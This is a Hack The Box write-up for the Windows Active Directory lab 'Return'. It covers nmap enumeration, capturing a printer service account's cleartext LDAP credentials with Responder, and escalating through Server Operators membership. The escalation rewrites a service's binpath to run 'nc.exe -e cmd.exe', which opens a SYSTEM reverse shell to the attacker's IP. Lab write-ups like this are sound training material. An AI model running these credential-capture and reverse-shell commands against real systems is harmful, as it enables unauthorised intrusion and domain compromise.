---
machine: Return
platform: Hack The Box
category: AD
os: Windows
difficulty: Easy
points: 20
tags: [ldap-relay, printer-creds, server-operators, winrm, privilege-escalation]
date: 2026-02-20
status: retired
summary: A short Active Directory box centered on a network printer's administration interface and the credentials it exposes through LDAP authentication. It exercises capturing service-account credentials by redirecting an appliance's directory binds, then chaining a privileged Windows group membership into SYSTEM-level service abuse for full domain compromise.
---

## Enumeration

Nmap Scan:

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-05 09:53 -0400
Nmap scan report for 10.129.62.245
Host is up (0.032s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-05 14:12:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-05T14:12:11
|_  start_date: N/A
|_clock-skew: 18m35s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.25 seconds

```

We notice immediately a web server, smb, and winrm, and ldap
Domain: `return.local`

Our website shows a printer admin panel, printers frequently access LDAP servers to look up AD users and SMB servers so they can save scans to network shares.

## Foothold

We can set the printer's server address to our tun0 ip so it attempts to LDAP authenticate with us instead of the genuine DC.  We also setup responder to intercept the LDAP traffic on our tun0 interface: `sudo responder -I tun0 -v`

and responder catches:

```text
[LDAP] Cleartext Client   : 10.129.62.245
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

We now have a cred pair we can try against evil-winrm and other services

```bash
┌──(kali㉿kali)-[~/htb/return]
└─$ nxc ldap 10.129.62.245 -u 'svc-printer' -p '1edFg43012!!' -d return.local
LDAP        10.129.62.245   389    PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local) (signing:None) (channel binding:No TLS cert)                                                                                                            
LDAP        10.129.62.245   389    PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
                                                                                                                                             
┌──(kali㉿kali)-[~/htb/return]
└─$ nxc winrm 10.129.62.245 -u 'svc-printer' -p '1edFg43012!!' -d return.local
WINRM       10.129.62.245   5985   PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.62.245   5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
                                                                                                                                             
┌──(kali㉿kali)-[~/htb/return]
└─$ nxc smb 10.129.62.245 -u 'svc-printer' -p '1edFg43012!!' -d return.local
SMB         10.129.62.245   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                        
SMB         10.129.62.245   445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
```

## Privilege Escalation

### WinRM and Privesc

After we find we can successfully connect with WinRM we begin enumerating permissions / privileges our svc-printer user has.  

We notice an unusual group `Server Operator` which allows us to modify service configs and stop and start them.  Given that we are on a domain machine, we can use this to hijack a legitimate service binaries path and run our own arbitrary binary at SYSTEM level giving us Domain Machine Account privileges allowing us to DCSync and Golden Ticket to access whatever we want for complete domain compromise

#### Performing the Server Operator sc.exe config Privilege Escalation

First I uploaded the netcat binary to create a reverse shell on the windows machine:

```bash
upload /usr/share/windows-resources/binaries/nc.exe
```

Then I modified the binary path (what binary is called when the service is run) to run the netcat binary i uploaded via cmd over an arbitrary port to my IP

```powershell
sc.exe config vss binpath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.15.97 1337"
```

Now I just needed to start a listener on 1337 on my host machine and stop and start the `SYSTEM` service to gain the `SYSTEM` shell:
`sc.exe stop vss` and `sc.exe start vss`

```bash
┌──(kali㉿kali)-[~/htb/return]
└─$ nc -lvnp 1337                             
listening on [any] 1337 ...
connect to [10.10.15.97] from (UNKNOWN) [10.129.62.245] 60970
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

From here we can either add our user to Domain Admins or local Administrators and then get the flag from `type C:\Users\Administrator\Desktop\root.txt`
